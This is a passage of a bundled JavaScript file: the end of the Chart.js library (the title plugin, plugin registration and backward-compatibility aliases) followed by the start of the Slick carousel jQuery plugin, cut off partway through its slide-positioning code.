    title: {
      display: false,
      fontStyle: "bold",
      fullWidth: true,
      padding: 10,
      position: "top",
      text: "",
      weight: 2000, // by default greater than legend (1000) to be above
    },
  });

  /**
   * IMPORTANT: this class is exposed publicly as Chart.Legend, backward compatibility required!
   */
  var Title = core_element.extend({
    initialize: function (config) {
      var me = this;
      helpers$1.extend(me, config);

      // Contains hit boxes for each dataset (in dataset order)
      me.legendHitBoxes = [];
    },

    // These methods are ordered by lifecycle. Utilities then follow.

    beforeUpdate: noop$2,
    update: function (maxWidth, maxHeight, margins) {
      var me = this;

      // Update Lifecycle - Probably don't want to ever extend or overwrite this function ;)
      me.beforeUpdate();

      // Absorb the master measurements
      me.maxWidth = maxWidth;
      me.maxHeight = maxHeight;
      me.margins = margins;

      // Dimensions
      me.beforeSetDimensions();
      me.setDimensions();
      me.afterSetDimensions();
      // Labels
      me.beforeBuildLabels();
      me.buildLabels();
      me.afterBuildLabels();

      // Fit
      me.beforeFit();
      me.fit();
      me.afterFit();
      //
      me.afterUpdate();

      return me.minSize;
    },
    afterUpdate: noop$2,

    //

    beforeSetDimensions: noop$2,
    setDimensions: function () {
      var me = this;
      // Set the unconstrained dimension before label rotation
      if (me.isHorizontal()) {
        // Reset position before calculating rotation
        me.width = me.maxWidth;
        me.left = 0;
        me.right = me.width;
      } else {
        me.height = me.maxHeight;

        // Reset position before calculating rotation
        me.top = 0;
        me.bottom = me.height;
      }

      // Reset padding
      me.paddingLeft = 0;
      me.paddingTop = 0;
      me.paddingRight = 0;
      me.paddingBottom = 0;

      // Reset minSize
      me.minSize = {
        width: 0,
        height: 0,
      };
    },
    afterSetDimensions: noop$2,

    //

    beforeBuildLabels: noop$2,
    buildLabels: noop$2,
    afterBuildLabels: noop$2,

    //

    beforeFit: noop$2,
    fit: function () {
      var me = this;
      var opts = me.options;
      var minSize = (me.minSize = {});
      var isHorizontal = me.isHorizontal();
      var lineCount, textSize;

      if (!opts.display) {
        me.width = minSize.width = me.height = minSize.height = 0;
        return;
      }

      lineCount = helpers$1.isArray(opts.text) ? opts.text.length : 1;
      textSize =
        lineCount * helpers$1.options._parseFont(opts).lineHeight +
        opts.padding * 2;

      me.width = minSize.width = isHorizontal ? me.maxWidth : textSize;
      me.height = minSize.height = isHorizontal ? textSize : me.maxHeight;
    },
    afterFit: noop$2,

    // Shared Methods
    isHorizontal: function () {
      var pos = this.options.position;
      return pos === "top" || pos === "bottom";
    },

    // Actually draw the title block on the canvas
    draw: function () {
      var me = this;
      var ctx = me.ctx;
      var opts = me.options;

      if (!opts.display) {
        return;
      }

      var fontOpts = helpers$1.options._parseFont(opts);
      var lineHeight = fontOpts.lineHeight;
      var offset = lineHeight / 2 + opts.padding;
      var rotation = 0;
      var top = me.top;
      var left = me.left;
      var bottom = me.bottom;
      var right = me.right;
      var maxWidth, titleX, titleY;

      ctx.fillStyle = helpers$1.valueOrDefault(
        opts.fontColor,
        core_defaults.global.defaultFontColor
      ); // render in correct colour
      ctx.font = fontOpts.string;

      // Horizontal
      if (me.isHorizontal()) {
        titleX = left + (right - left) / 2; // midpoint of the width
        titleY = top + offset;
        maxWidth = right - left;
      } else {
        titleX = opts.position === "left" ? left + offset : right - offset;
        titleY = top + (bottom - top) / 2;
        maxWidth = bottom - top;
        rotation = Math.PI * (opts.position === "left" ? -0.5 : 0.5);
      }

      ctx.save();
      ctx.translate(titleX, titleY);
      ctx.rotate(rotation);
      ctx.textAlign = "center";
      ctx.textBaseline = "middle";

      var text = opts.text;
      if (helpers$1.isArray(text)) {
        var y = 0;
        for (var i = 0; i < text.length; ++i) {
          ctx.fillText(text[i], 0, y, maxWidth);
          y += lineHeight;
        }
      } else {
        ctx.fillText(text, 0, 0, maxWidth);
      }

      ctx.restore();
    },
  });

  function createNewTitleBlockAndAttach(chart, titleOpts) {
    var title = new Title({
      ctx: chart.ctx,
      options: titleOpts,
      chart: chart,
    });

    core_layouts.configure(chart, title, titleOpts);
    core_layouts.addBox(chart, title);
    chart.titleBlock = title;
  }

  var plugin_title = {
    id: "title",

    /**
     * Backward compatibility: since 2.1.5, the title is registered as a plugin, making
     * Chart.Title obsolete. To avoid a breaking change, we export the Title as part of
     * the plugin, which one will be re-exposed in the chart.js file.
     * https://github.com/chartjs/Chart.js/pull/2640
     * @private
     */
    _element: Title,

    beforeInit: function (chart) {
      var titleOpts = chart.options.title;

      if (titleOpts) {
        createNewTitleBlockAndAttach(chart, titleOpts);
      }
    },

    beforeUpdate: function (chart) {
      var titleOpts = chart.options.title;
      var titleBlock = chart.titleBlock;

      if (titleOpts) {
        helpers$1.mergeIf(titleOpts, core_defaults.global.title);

        if (titleBlock) {
          core_layouts.configure(chart, titleBlock, titleOpts);
          titleBlock.options = titleOpts;
        } else {
          createNewTitleBlockAndAttach(chart, titleOpts);
        }
      } else if (titleBlock) {
        core_layouts.removeBox(chart, titleBlock);
        delete chart.titleBlock;
      }
    },
  };

  var plugins = {};
  var filler = plugin_filler;
  var legend = plugin_legend;
  var title = plugin_title;
  plugins.filler = filler;
  plugins.legend = legend;
  plugins.title = title;

  /**
   * @namespace Chart
   */

  core_controller.helpers = helpers$1;

  // @todo dispatch these helpers into appropriated helpers/helpers.* file and write unit tests!
  core_helpers();

  core_controller._adapters = core_adapters;
  core_controller.Animation = core_animation;
  core_controller.animationService = core_animations;
  core_controller.controllers = controllers;
  core_controller.DatasetController = core_datasetController;
  core_controller.defaults = core_defaults;
  core_controller.Element = core_element;
  core_controller.elements = elements;
  core_controller.Interaction = core_interaction;
  core_controller.layouts = core_layouts;
  core_controller.platform = platform;
  core_controller.plugins = core_plugins;
  core_controller.Scale = core_scale;
  core_controller.scaleService = core_scaleService;
  core_controller.Ticks = core_ticks;
  core_controller.Tooltip = core_tooltip;

  // Register built-in scales

  core_controller.helpers.each(scales, function (scale, type) {
    core_controller.scaleService.registerScaleType(
      type,
      scale,
      scale._defaults
    );
  });

  // Load to register built-in adapters (as side effects)

  // Loading built-in plugins

  for (var k in plugins) {
    if (plugins.hasOwnProperty(k)) {
      core_controller.plugins.register(plugins[k]);
    }
  }

  core_controller.platform.initialize();

  var src = core_controller;
  if (typeof window !== "undefined") {
    window.Chart = core_controller;
  }

  // DEPRECATIONS

  /**
   * Provided for backward compatibility, not available anymore
   * @namespace Chart.Chart
   * @deprecated since version 2.8.0
   * @todo remove at version 3
   * @private
   */
  core_controller.Chart = core_controller;

  /**
   * Provided for backward compatibility, not available anymore
   * @namespace Chart.Legend
   * @deprecated since version 2.1.5
   * @todo remove at version 3
   * @private
   */
  core_controller.Legend = plugins.legend._element;

  /**
   * Provided for backward compatibility, not available anymore
   * @namespace Chart.Title
   * @deprecated since version 2.1.5
   * @todo remove at version 3
   * @private
   */
  core_controller.Title = plugins.title._element;

  /**
   * Provided for backward compatibility, use Chart.plugins instead
   * @namespace Chart.pluginService
   * @deprecated since version 2.1.5
   * @todo remove at version 3
   * @private
   */
  core_controller.pluginService = core_controller.plugins;

  /**
   * Provided for backward compatibility, inheriting from Chart.PlugingBase has no
   * effect, instead simply create/register plugins via plain JavaScript objects.
   * @interface Chart.PluginBase
   * @deprecated since version 2.5.0
   * @todo remove at version 3
   * @private
   */
  core_controller.PluginBase = core_controller.Element.extend({});

  /**
   * Provided for backward compatibility, use Chart.helpers.canvas instead.
   * @namespace Chart.canvasHelpers
   * @deprecated since version 2.6.0
   * @todo remove at version 3
   * @private
   */
  core_controller.canvasHelpers = core_controller.helpers.canvas;

  /**
   * Provided for backward compatibility, use Chart.layouts instead.
   * @namespace Chart.layoutService
   * @deprecated since version 2.7.3
   * @todo remove at version 3
   * @private
   */
  core_controller.layoutService = core_controller.layouts;

  /**
   * Provided for backward compatibility, not available anymore.
   * @namespace Chart.LinearScaleBase
   * @deprecated since version 2.8
   * @todo remove at version 3
   * @private
   */
  core_controller.LinearScaleBase = scale_linearbase;

  /**
   * Provided for backward compatibility, instead we should create a new Chart
   * by setting the type in the config (`new Chart(id, {type: '{chart-type}'}`).
   * @deprecated since version 2.8.0
   * @todo remove at version 3
   */
  core_controller.helpers.each(
    ["Bar", "Bubble", "Doughnut", "Line", "PolarArea", "Radar", "Scatter"],
    function (klass) {
      core_controller[klass] = function (ctx, cfg) {
        return new core_controller(
          ctx,
          core_controller.helpers.merge(cfg || {}, {
            type: klass.charAt(0).toLowerCase() + klass.slice(1),
          })
        );
      };
    }
  );

  return src;
});
// -------------------------------  chartjs
!(function (i) {
  "use strict";
  "function" == typeof define && define.amd
    ? define(["jquery"], i)
    : "undefined" != typeof exports
    ? (module.exports = i(require("jquery")))
    : i(jQuery);
})(function (i) {
  "use strict";
  var e = window.Slick || {};
  ((e = (function () {
    var e = 0;
    return function (t, o) {
      var s,
        n = this;
      (n.defaults = {
        accessibility: !0,
        adaptiveHeight: !1,
        appendArrows: i(t),
        appendDots: i(t),
        arrows: !0,
        asNavFor: null,
        prevArrow:
          '<button class="slick-prev" aria-label="Previous" type="button">Previous</button>',
        nextArrow:
          '<button class="slick-next" aria-label="Next" type="button">Next</button>',
        autoplay: !1,
        autoplaySpeed: 3e3,
        centerMode: !1,
        centerPadding: "50px",
        cssEase: "ease",
        customPaging: function (e, t) {
          return i('<button type="button" />').text(t + 1);
        },
        dots: !1,
        dotsClass: "slick-dots",
        draggable: !0,
        easing: "linear",
        edgeFriction: 0.35,
        fade: !1,
        focusOnSelect: !1,
        focusOnChange: !1,
        infinite: !0,
        initialSlide: 0,
        lazyLoad: "ondemand",
        mobileFirst: !1,
        pauseOnHover: !0,
        pauseOnFocus: !0,
        pauseOnDotsHover: !1,
        respondTo: "window",
        responsive: null,
        rows: 1,
        rtl: !1,
        slide: "",
        slidesPerRow: 1,
        slidesToShow: 1,
        slidesToScroll: 1,
        speed: 500,
        swipe: !0,
        swipeToSlide: !1,
        touchMove: !0,
        touchThreshold: 5,
        useCSS: !0,
        useTransform: !0,
        variableWidth: !1,
        vertical: !1,
        verticalSwiping: !1,
        waitForAnimate: !0,
        zIndex: 1e3,
      }),
        (n.initials = {
          animating: !1,
          dragging: !1,
          autoPlayTimer: null,
          currentDirection: 0,
          currentLeft: null,
          currentSlide: 0,
          direction: 1,
          $dots: null,
          listWidth: null,
          listHeight: null,
          loadIndex: 0,
          $nextArrow: null,
          $prevArrow: null,
          scrolling: !1,
          slideCount: null,
          slideWidth: null,
          $slideTrack: null,
          $slides: null,
          sliding: !1,
          slideOffset: 0,
          swipeLeft: null,
          swiping: !1,
          $list: null,
          touchObject: {},
          transformsEnabled: !1,
          unslicked: !1,
        }),
        i.extend(n, n.initials),
        (n.activeBreakpoint = null),
        (n.animType = null),
        (n.animProp = null),
        (n.breakpoints = []),
        (n.breakpointSettings = []),
        (n.cssTransitions = !1),
        (n.focussed = !1),
        (n.interrupted = !1),
        (n.hidden = "hidden"),
        (n.paused = !0),
        (n.positionProp = null),
        (n.respondTo = null),
        (n.rowCount = 1),
        (n.shouldClick = !0),
        (n.$slider = i(t)),
        (n.$slidesCache = null),
        (n.transformType = null),
        (n.transitionType = null),
        (n.visibilityChange = "visibilitychange"),
        (n.windowWidth = 0),
        (n.windowTimer = null),
        (s = i(t).data("slick") || {}),
        (n.options = i.extend({}, n.defaults, o, s)),
        (n.currentSlide = n.options.initialSlide),
        (n.originalSettings = n.options),
        void 0 !== document.mozHidden
          ? ((n.hidden = "mozHidden"),
            (n.visibilityChange = "mozvisibilitychange"))
          : void 0 !== document.webkitHidden &&
            ((n.hidden = "webkitHidden"),
            (n.visibilityChange = "webkitvisibilitychange")),
        (n.autoPlay = i.proxy(n.autoPlay, n)),
        (n.autoPlayClear = i.proxy(n.autoPlayClear, n)),
        (n.autoPlayIterator = i.proxy(n.autoPlayIterator, n)),
        (n.changeSlide = i.proxy(n.changeSlide, n)),
        (n.clickHandler = i.proxy(n.clickHandler, n)),
        (n.selectHandler = i.proxy(n.selectHandler, n)),
        (n.setPosition = i.proxy(n.setPosition, n)),
        (n.swipeHandler = i.proxy(n.swipeHandler, n)),
        (n.dragHandler = i.proxy(n.dragHandler, n)),
        (n.keyHandler = i.proxy(n.keyHandler, n)),
        (n.instanceUid = e++),
        (n.htmlExpr = /^(?:\s*(<[\w\W]+>)[^>]*)$/),
        n.registerBreakpoints(),
        n.init(!0);
    };
  })()).prototype.activateADA = function () {
    this.$slideTrack
      .find(".slick-active")
      .attr({ "aria-hidden": "false" })
      .find("a, input, button, select")
      .attr({ tabindex: "0" });
  }),
    (e.prototype.addSlide = e.prototype.slickAdd =
      function (e, t, o) {
        var s = this;
        if ("boolean" == typeof t) (o = t), (t = null);
        else if (t < 0 || t >= s.slideCount) return !1;
        s.unload(),
          "number" == typeof t
            ? 0 === t && 0 === s.$slides.length
              ? i(e).appendTo(s.$slideTrack)
              : o
              ? i(e).insertBefore(s.$slides.eq(t))
              : i(e).insertAfter(s.$slides.eq(t))
            : !0 === o
            ? i(e).prependTo(s.$slideTrack)
            : i(e).appendTo(s.$slideTrack),
          (s.$slides = s.$slideTrack.children(this.options.slide)),
          s.$slideTrack.children(this.options.slide).detach(),
          s.$slideTrack.append(s.$slides),
          s.$slides.each(function (e, t) {
            i(t).attr("data-slick-index", e);
          }),
          (s.$slidesCache = s.$slides),
          s.reinit();
      }),
    (e.prototype.animateHeight = function () {
      var i = this;
      if (
        1 === i.options.slidesToShow &&
        !0 === i.options.adaptiveHeight &&
        !1 === i.options.vertical
      ) {
        var e = i.$slides.eq(i.currentSlide).outerHeight(!0);
        i.$list.animate({ height: e }, i.options.speed);
      }
    }),
    (e.prototype.animateSlide = function (e, t) {
      var o = {},
        s = this;
      s.animateHeight(),
        !0 === s.options.rtl && !1 === s.options.vertical && (e = -e),
        !1 === s.transformsEnabled
          ? !1 === s.options.vertical
            ? s.$slideTrack.animate(
                { left: e },
                s.options.speed,
                s.options.easing,
                t
              )
            : s.$slideTrack.animate(
                { top: e },
                s.options.speed,
                s.options.easing,
                t
              )
          : !1 === s.cssTransitions
          ? (!0 === s.options.rtl && (s.currentLeft = -s.currentLeft),
            i({ animStart: s.currentLeft }).animate(
              { animStart: e },
              {
                duration: s.options.speed,
                easing: s.options.easing,
                step: function (i) {
                  (i = Math.ceil(i)),
                    !1 === s.options.vertical
                      ? ((o[s.animType] = "translate(" + i + "px, 0px)"),
                        s.$slideTrack.css(o))
                      : ((o[s.animType] = "translate(0px," + i + "px)"),
                        s.$slideTrack.css(o));
                },
                complete: function () {
                  t && t.call();
                },
              }
            ))
          : (s.applyTransition(),
            (e = Math.ceil(e)),
            !1 === s.options.vertical
              ? (o[s.animType] = "translate3d(" + e + "px, 0px, 0px)")
              : (o[s.animType] = "translate3d(0px," + e + "px, 0px)"),
            s.$slideTrack.css(o),
            t &&
              setTimeout(function () {
                s.disableTransition(), t.call();
              }, s.options.speed));
    }),
    (e.prototype.getNavTarget = function () {
      var e = this,
        t = e.options.asNavFor;
      return t && null !== t && (t = i(t).not(e.$slider)), t;
    }),
    (e.prototype.asNavFor = function (e) {
      var t = this.getNavTarget();
      null !== t &&
        "object" == typeof t &&
        t.each(function () {
          var t = i(this).slick("getSlick");
          t.unslicked || t.slideHandler(e, !0);
        });
    }),
    (e.prototype.applyTransition = function (i) {
      var e = this,
        t = {};
      !1 === e.options.fade
        ? (t[e.transitionType] =
            e.transformType + " " + e.options.speed + "ms " + e.options.cssEase)
        : (t[e.transitionType] =
            "opacity " + e.options.speed + "ms " + e.options.cssEase),
        !1 === e.options.fade ? e.$slideTrack.css(t) : e.$slides.eq(i).css(t);
    }),
    (e.prototype.autoPlay = function () {
      var i = this;
      i.autoPlayClear(),
        i.slideCount > i.options.slidesToShow &&
          (i.autoPlayTimer = setInterval(
            i.autoPlayIterator,
            i.options.autoplaySpeed
          ));
    }),
    (e.prototype.autoPlayClear = function () {
      var i = this;
      i.autoPlayTimer && clearInterval(i.autoPlayTimer);
    }),
    (e.prototype.autoPlayIterator = function () {
      var i = this,
        e = i.currentSlide + i.options.slidesToScroll;
      i.paused ||
        i.interrupted ||
        i.focussed ||
        (!1 === i.options.infinite &&
          (1 === i.direction && i.currentSlide + 1 === i.slideCount - 1
            ? (i.direction = 0)
            : 0 === i.direction &&
              ((e = i.currentSlide - i.options.slidesToScroll),
              i.currentSlide - 1 == 0 && (i.direction = 1))),
        i.slideHandler(e));
    }),
    (e.prototype.buildArrows = function () {
      var e = this;
      !0 === e.options.arrows &&
        ((e.$prevArrow = i(e.options.prevArrow).addClass("slick-arrow")),
        (e.$nextArrow = i(e.options.nextArrow).addClass("slick-arrow")),
        e.slideCount > e.options.slidesToShow
          ? (e.$prevArrow
              .removeClass("slick-hidden")
              .removeAttr("aria-hidden tabindex"),
            e.$nextArrow
              .removeClass("slick-hidden")
              .removeAttr("aria-hidden tabindex"),
            e.htmlExpr.test(e.options.prevArrow) &&
              e.$prevArrow.prependTo(e.options.appendArrows),
            e.htmlExpr.test(e.options.nextArrow) &&
              e.$nextArrow.appendTo(e.options.appendArrows),
            !0 !== e.options.infinite &&
              e.$prevArrow
                .addClass("slick-disabled")
                .attr("aria-disabled", "true"))
          : e.$prevArrow
              .add(e.$nextArrow)
              .addClass("slick-hidden")
              .attr({ "aria-disabled": "true", tabindex: "-1" }));
    }),
    (e.prototype.buildDots = function () {
      var e,
        t,
        o = this;
      if (!0 === o.options.dots) {
        for (
          o.$slider.addClass("slick-dotted"),
            t = i("<ul />").addClass(o.options.dotsClass),
            e = 0;
          e <= o.getDotCount();
          e += 1
        )
          t.append(i("<li />").append(o.options.customPaging.call(this, o, e)));
        (o.$dots = t.appendTo(o.options.appendDots)),
          o.$dots.find("li").first().addClass("slick-active");
      }
    }),
    (e.prototype.buildOut = function () {
      var e = this;
      (e.$slides = e.$slider
        .children(e.options.slide + ":not(.slick-cloned)")
        .addClass("slick-slide")),
        (e.slideCount = e.$slides.length),
        e.$slides.each(function (e, t) {
          i(t)
            .attr("data-slick-index", e)
            .data("originalStyling", i(t).attr("style") || "");
        }),
        e.$slider.addClass("slick-slider"),
        (e.$slideTrack =
          0 === e.slideCount
            ? i('<div class="slick-track"/>').appendTo(e.$slider)
            : e.$slides.wrapAll('<div class="slick-track"/>').parent()),
        (e.$list = e.$slideTrack.wrap('<div class="slick-list"/>').parent()),
        e.$slideTrack.css("opacity", 0),
        (!0 !== e.options.centerMode && !0 !== e.options.swipeToSlide) ||
          (e.options.slidesToScroll = 1),
        i("img[data-lazy]", e.$slider).not("[src]").addClass("slick-loading"),
        e.setupInfinite(),
        e.buildArrows(),
        e.buildDots(),
        e.updateDots(),
        e.setSlideClasses(
          "number" == typeof e.currentSlide ? e.currentSlide : 0
        ),
        !0 === e.options.draggable && e.$list.addClass("draggable");
    }),
    (e.prototype.buildRows = function () {
      var i,
        e,
        t,
        o,
        s,
        n,
        r,
        l = this;
      if (
        ((o = document.createDocumentFragment()),
        (n = l.$slider.children()),
        l.options.rows > 1)
      ) {
        for (
          r = l.options.slidesPerRow * l.options.rows,
            s = Math.ceil(n.length / r),
            i = 0;
          i < s;
          i++
        ) {
          var d = document.createElement("div");
          for (e = 0; e < l.options.rows; e++) {
            var a = document.createElement("div");
            for (t = 0; t < l.options.slidesPerRow; t++) {
              var c = i * r + (e * l.options.slidesPerRow + t);
              n.get(c) && a.appendChild(n.get(c));
            }
            d.appendChild(a);
          }
          o.appendChild(d);
        }
        l.$slider.empty().append(o),
          l.$slider
            .children()
            .children()
            .children()
            .css({
              width: 100 / l.options.slidesPerRow + "%",
              display: "inline-block",
            });
      }
    }),
    (e.prototype.checkResponsive = function (e, t) {
      var o,
        s,
        n,
        r = this,
        l = !1,
        d = r.$slider.width(),
        a = window.innerWidth || i(window).width();
      if (
        ("window" === r.respondTo
          ? (n = a)
          : "slider" === r.respondTo
          ? (n = d)
          : "min" === r.respondTo && (n = Math.min(a, d)),
        r.options.responsive &&
          r.options.responsive.length &&
          null !== r.options.responsive)
      ) {
        s = null;
        for (o in r.breakpoints)
          r.breakpoints.hasOwnProperty(o) &&
            (!1 === r.originalSettings.mobileFirst
              ? n < r.breakpoints[o] && (s = r.breakpoints[o])
              : n > r.breakpoints[o] && (s = r.breakpoints[o]));
        null !== s
          ? null !== r.activeBreakpoint
            ? (s !== r.activeBreakpoint || t) &&
              ((r.activeBreakpoint = s),
              "unslick" === r.breakpointSettings[s]
                ? r.unslick(s)
                : ((r.options = i.extend(
                    {},
                    r.originalSettings,
                    r.breakpointSettings[s]
                  )),
                  !0 === e && (r.currentSlide = r.options.initialSlide),
                  r.refresh(e)),
              (l = s))
            : ((r.activeBreakpoint = s),
              "unslick" === r.breakpointSettings[s]
                ? r.unslick(s)
                : ((r.options = i.extend(
                    {},
                    r.originalSettings,
                    r.breakpointSettings[s]
                  )),
                  !0 === e && (r.currentSlide = r.options.initialSlide),
                  r.refresh(e)),
              (l = s))
          : null !== r.activeBreakpoint &&
            ((r.activeBreakpoint = null),
            (r.options = r.originalSettings),
            !0 === e && (r.currentSlide = r.options.initialSlide),
            r.refresh(e),
            (l = s)),
          e || !1 === l || r.$slider.trigger("breakpoint", [r, l]);
      }
    }),
    (e.prototype.changeSlide = function (e, t) {
      var o,
        s,
        n,
        r = this,
        l = i(e.currentTarget);
      switch (
        (l.is("a") && e.preventDefault(),
        l.is("li") || (l = l.closest("li")),
        (n = r.slideCount % r.options.slidesToScroll != 0),
        (o = n
          ? 0
          : (r.slideCount - r.currentSlide) % r.options.slidesToScroll),
        e.data.message)
      ) {
        case "previous":
          (s = 0 === o ? r.options.slidesToScroll : r.options.slidesToShow - o),
            r.slideCount > r.options.slidesToShow &&
              r.slideHandler(r.currentSlide - s, !1, t);
          break;
        case "next":
          (s = 0 === o ? r.options.slidesToScroll : o),
            r.slideCount > r.options.slidesToShow &&
              r.slideHandler(r.currentSlide + s, !1, t);
          break;
        case "index":
          var d =
            0 === e.data.index
              ? 0
              : e.data.index || l.index() * r.options.slidesToScroll;
          r.slideHandler(r.checkNavigable(d), !1, t),
            l.children().trigger("focus");
          break;
        default:
          return;
      }
    }),
    (e.prototype.checkNavigable = function (i) {
      var e, t;
      if (((e = this.getNavigableIndexes()), (t = 0), i > e[e.length - 1]))
        i = e[e.length - 1];
      else
        for (var o in e) {
          if (i < e[o]) {
            i = t;
            break;
          }
          t = e[o];
        }
      return i;
    }),
    (e.prototype.cleanUpEvents = function () {
      var e = this;
      e.options.dots &&
        null !== e.$dots &&
        (i("li", e.$dots)
          .off("click.slick", e.changeSlide)
          .off("mouseenter.slick", i.proxy(e.interrupt, e, !0))
          .off("mouseleave.slick", i.proxy(e.interrupt, e, !1)),
        !0 === e.options.accessibility &&
          e.$dots.off("keydown.slick", e.keyHandler)),
        e.$slider.off("focus.slick blur.slick"),
        !0 === e.options.arrows &&
          e.slideCount > e.options.slidesToShow &&
          (e.$prevArrow && e.$prevArrow.off("click.slick", e.changeSlide),
          e.$nextArrow && e.$nextArrow.off("click.slick", e.changeSlide),
          !0 === e.options.accessibility &&
            (e.$prevArrow && e.$prevArrow.off("keydown.slick", e.keyHandler),
            e.$nextArrow && e.$nextArrow.off("keydown.slick", e.keyHandler))),
        e.$list.off("touchstart.slick mousedown.slick", e.swipeHandler),
        e.$list.off("touchmove.slick mousemove.slick", e.swipeHandler),
        e.$list.off("touchend.slick mouseup.slick", e.swipeHandler),
        e.$list.off("touchcancel.slick mouseleave.slick", e.swipeHandler),
        e.$list.off("click.slick", e.clickHandler),
        i(document).off(e.visibilityChange, e.visibility),
        e.cleanUpSlideEvents(),
        !0 === e.options.accessibility &&
          e.$list.off("keydown.slick", e.keyHandler),
        !0 === e.options.focusOnSelect &&
          i(e.$slideTrack).children().off("click.slick", e.selectHandler),
        i(window).off(
          "orientationchange.slick.slick-" + e.instanceUid,
          e.orientationChange
        ),
        i(window).off("resize.slick.slick-" + e.instanceUid, e.resize),
        i("[draggable!=true]", e.$slideTrack).off(
          "dragstart",
          e.preventDefault
        ),
        i(window).off("load.slick.slick-" + e.instanceUid, e.setPosition);
    }),
    (e.prototype.cleanUpSlideEvents = function () {
      var e = this;
      e.$list.off("mouseenter.slick", i.proxy(e.interrupt, e, !0)),
        e.$list.off("mouseleave.slick", i.proxy(e.interrupt, e, !1));
    }),
    (e.prototype.cleanUpRows = function () {
      var i,
        e = this;
      e.options.rows > 1 &&
        ((i = e.$slides.children().children()).removeAttr("style"),
        e.$slider.empty().append(i));
    }),
    (e.prototype.clickHandler = function (i) {
      !1 === this.shouldClick &&
        (i.stopImmediatePropagation(), i.stopPropagation(), i.preventDefault());
    }),
    (e.prototype.destroy = function (e) {
      var t = this;
      t.autoPlayClear(),
        (t.touchObject = {}),
        t.cleanUpEvents(),
        i(".slick-cloned", t.$slider).detach(),
        t.$dots && t.$dots.remove(),
        t.$prevArrow &&
          t.$prevArrow.length &&
          (t.$prevArrow
            .removeClass("slick-disabled slick-arrow slick-hidden")
            .removeAttr("aria-hidden aria-disabled tabindex")
            .css("display", ""),
          t.htmlExpr.test(t.options.prevArrow) && t.$prevArrow.remove()),
        t.$nextArrow &&
          t.$nextArrow.length &&
          (t.$nextArrow
            .removeClass("slick-disabled slick-arrow slick-hidden")
            .removeAttr("aria-hidden aria-disabled tabindex")
            .css("display", ""),
          t.htmlExpr.test(t.options.nextArrow) && t.$nextArrow.remove()),
        t.$slides &&
          (t.$slides
            .removeClass(
              "slick-slide slick-active slick-center slick-visible slick-current"
            )
            .removeAttr("aria-hidden")
            .removeAttr("data-slick-index")
            .each(function () {
              i(this).attr("style", i(this).data("originalStyling"));
            }),
          t.$slideTrack.children(this.options.slide).detach(),
          t.$slideTrack.detach(),
          t.$list.detach(),
          t.$slider.append(t.$slides)),
        t.cleanUpRows(),
        t.$slider.removeClass("slick-slider"),
        t.$slider.removeClass("slick-initialized"),
        t.$slider.removeClass("slick-dotted"),
        (t.unslicked = !0),
        e || t.$slider.trigger("destroy", [t]);
    }),
    (e.prototype.disableTransition = function (i) {
      var e = this,
        t = {};
      (t[e.transitionType] = ""),
        !1 === e.options.fade ? e.$slideTrack.css(t) : e.$slides.eq(i).css(t);
    }),
    (e.prototype.fadeSlide = function (i, e) {
      var t = this;
      !1 === t.cssTransitions
        ? (t.$slides.eq(i).css({ zIndex: t.options.zIndex }),
          t.$slides
            .eq(i)
            .animate({ opacity: 1 }, t.options.speed, t.options.easing, e))
        : (t.applyTransition(i),
          t.$slides.eq(i).css({ opacity: 1, zIndex: t.options.zIndex }),
          e &&
            setTimeout(function () {
              t.disableTransition(i), e.call();
            }, t.options.speed));
    }),
    (e.prototype.fadeSlideOut = function (i) {
      var e = this;
      !1 === e.cssTransitions
        ? e.$slides
            .eq(i)
            .animate(
              { opacity: 0, zIndex: e.options.zIndex - 2 },
              e.options.speed,
              e.options.easing
            )
        : (e.applyTransition(i),
          e.$slides.eq(i).css({ opacity: 0, zIndex: e.options.zIndex - 2 }));
    }),
    (e.prototype.filterSlides = e.prototype.slickFilter =
      function (i) {
        var e = this;
        null !== i &&
          ((e.$slidesCache = e.$slides),
          e.unload(),
          e.$slideTrack.children(this.options.slide).detach(),
          e.$slidesCache.filter(i).appendTo(e.$slideTrack),
          e.reinit());
      }),
    (e.prototype.focusHandler = function () {
      var e = this;
      e.$slider
        .off("focus.slick blur.slick")
        .on("focus.slick blur.slick", "*", function (t) {
          t.stopImmediatePropagation();
          var o = i(this);
          setTimeout(function () {
            e.options.pauseOnFocus &&
              ((e.focussed = o.is(":focus")), e.autoPlay());
          }, 0);
        });
    }),
    (e.prototype.getCurrent = e.prototype.slickCurrentSlide =
      function () {
        return this.currentSlide;
      }),
    (e.prototype.getDotCount = function () {
      var i = this,
        e = 0,
        t = 0,
        o = 0;
      if (!0 === i.options.infinite)
        if (i.slideCount <= i.options.slidesToShow) ++o;
        else
          for (; e < i.slideCount; )
            ++o,
              (e = t + i.options.slidesToScroll),
              (t +=
                i.options.slidesToScroll <= i.options.slidesToShow
                  ? i.options.slidesToScroll
                  : i.options.slidesToShow);
      else if (!0 === i.options.centerMode) o = i.slideCount;
      else if (i.options.asNavFor)
        for (; e < i.slideCount; )
          ++o,
            (e = t + i.options.slidesToScroll),
            (t +=
              i.options.slidesToScroll <= i.options.slidesToShow
                ? i.options.slidesToScroll
                : i.options.slidesToShow);
      else
        o =
          1 +
          Math.ceil(
            (i.slideCount - i.options.slidesToShow) / i.options.slidesToScroll
          );
      return o - 1;
    }),
    (e.prototype.getLeft = function (i) {
      var e,
        t,
        o,
        s,
        n = this,
        r = 0;
      return (
        (n.slideOffset = 0),
        (t = n.$slides.first().outerHeight(!0)),
        !0 === n.options.infinite
          ? (n.slideCount > n.options.slidesToShow &&
              ((n.slideOffset = n.slideWidth * n.options.slidesToShow * -1),
              (s = -1),
              !0 === n.options.vertical &&
                !0 === n.options.centerMode &&
                (2 === n.options.slidesToShow
                  ? (s = -1.5)
                  : 1 === n.options.slidesToShow && (s = -2)),
              (r = t * n.options.slidesToShow * s)),
            n.slideCount % n.options.slidesToScroll != 0 &&
              i + n.options.slidesToScroll > n.slideCount &&
              n.slideCount > n.options.slidesToShow &&
              (i > n.slideCount
                ? ((n.slideOffset =
                    (n.options.slidesToShow - (i - n.slideCount)) *
                    n.slideWidth *
                    -1),
                  (r = (n.options.slidesToShow - (i - n.slideCount)) * t * -1))
                : ((n.slideOffset =
                    (n.slideCount % n.options.slidesToScroll) *
                    n.slideWidth *
                    -1),
                  (r = (n.slideCount % n.options.slidesToScroll) * t * -1))))
          : i + n.options.slidesToShow > n.slideCount &&
            ((n.slideOffset =
              (i + n.options.slidesToShow - n.slideCount) * n.slideWidth),
            (r = (i + n.options.slidesToShow - n.slideCount) * t)),
        n.slideCount <= n.options.slidesToShow &&
          ((n.slideOffset = 0), (r = 0)),
